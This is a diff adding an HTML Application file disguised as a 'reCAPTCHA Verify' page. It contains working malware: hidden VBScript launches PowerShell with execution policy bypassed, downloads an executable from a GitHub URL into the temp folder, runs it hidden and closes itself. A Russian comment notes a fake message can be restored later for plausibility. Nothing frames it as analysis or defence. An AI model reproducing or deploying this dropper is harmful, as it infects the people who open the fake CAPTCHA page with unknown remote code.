@@ -1,0 +1,18 @@
+<html>
+<head>
+    <title>reCAPTCHA Verify</title>
+    <hta:application showintaskbar="no" windowstate="minimize" />
+    <script language="VBScript">
+        On Error Resume Next
+        Set WShell = CreateObject("WScript.Shell")
+        Dim psCommand
+        psCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'https://github.com/gallagcherfrank/gerar/raw/refs/heads/main/1.exe' -OutFile '$env:TEMP\1.exe'; if (Test-Path '$env:TEMP\1.exe') {Start-Process -FilePath '$env:TEMP\1.exe' -WindowStyle Hidden; echo 'Success' > '$env:TEMP\hta_log.txt'} else {echo 'Error' > '$env:TEMP\hta_log.txt'}"""
+        WShell.Run psCommand, 0
+        WScript.Sleep 100
+        window.close()
+    </script>
+</head>
+<body>
+    <!-- Фейковое сообщение можно вернуть позже для правдоподобности -->
+</body>
+</html>
